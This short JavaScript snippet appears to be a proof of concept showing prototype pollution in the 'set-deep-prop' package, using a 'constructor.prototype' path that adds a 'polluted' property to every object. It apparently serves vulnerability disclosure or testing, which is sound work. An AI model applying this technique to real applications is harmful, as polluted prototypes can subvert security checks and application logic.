var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const setDeepProp = require('set-deep-prop');
var obj = {};
console.log({}.polluted);
setDeepProp(obj, [
    'constructor.prototype',
    'polluted'
], 'yes');
console.log({}.polluted);